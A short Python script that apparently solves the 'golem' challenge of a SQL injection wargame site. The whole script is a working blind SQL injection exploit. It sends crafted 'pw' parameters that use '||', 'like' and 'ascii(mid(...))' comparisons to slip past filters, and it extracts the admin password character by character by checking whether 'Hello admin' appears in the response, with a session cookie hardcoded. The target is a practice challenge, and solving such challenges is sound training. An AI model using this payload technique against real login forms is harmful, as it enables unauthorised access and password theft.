

import requests


url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw=1"
passid =  {'PHPSESSID': 'd390gv8lirld82i5opc2qapa7u'}
flag = ""

for pw_value in range(1,9):
    for ascii in range(48,128):
          value = " 2'|| id like 'admin' && not(ascii(mid(pw,{},1)) <> {}) #".format(pw_value,ascii)
          params = {'pw': value} 
          response = requests.get(url, params=params, cookies=passid)
          if 'Hello admin' in response.text :
            flag+=chr(ascii)
            print(flag)
            break
        #  print(response.text)
          print(pw_value,"번째 값 찾는중 : ",chr(ascii))
print("pw : ",flag)
